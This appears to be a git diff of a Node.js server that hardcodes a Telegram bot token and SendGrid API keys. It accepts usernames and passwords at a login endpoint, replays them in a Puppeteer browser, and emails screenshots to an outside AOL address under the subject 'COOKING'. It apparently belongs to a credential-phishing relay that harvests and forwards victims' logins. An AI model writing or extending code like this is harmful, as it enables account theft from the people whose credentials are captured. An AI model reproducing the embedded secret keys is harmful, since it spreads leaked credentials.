@@ -9,11 +9,11 @@ const TelegramBot = require('node-telegram-bot-api');
 const token = '5105794251:AAGF8VntDb0JeE16gRsxikITHzGuhN9Kjxs';
 const sgMail = require('@sendgrid/mail')
 const bot = new TelegramBot(token, { polling: false });
-const apiKey = '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'; // Replace this with your SendGrid API key
+const apiKey = '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'; // Replace this with your SendGrid API key
 
 sgMail.setApiKey(apiKey);
 
-// create reusable transporter object using the default SMTP transpor
+// create reusable transporter object using the default SMTP transport
 let transporter = nodemailer.createTransport({
   service: 'SendGrid',
   auth: {
@@ -53,7 +53,7 @@ app.post('/api/login', async (req, res) => {
        : puppeteer.executablePath(),
     });
     try{
-    console.log(username, password)
+    // console.log(username, password)
     const page = await browser.newPage();
     // let data = "Password failed"
         // set the viewport width to 1200 pixels
@@ -124,7 +124,7 @@ const mail = 'tonywhitton@aol.com'
 await page.screenshot({path: 'pol.png'});
 
 const mailOptions = {
-  from: 'COOK <admin@wind-piper.org>',
+  from: 'COOK <murraysheldonmurray@gmail.com>',
   to: mail,
   subject: 'COOKING',
   attachments: [
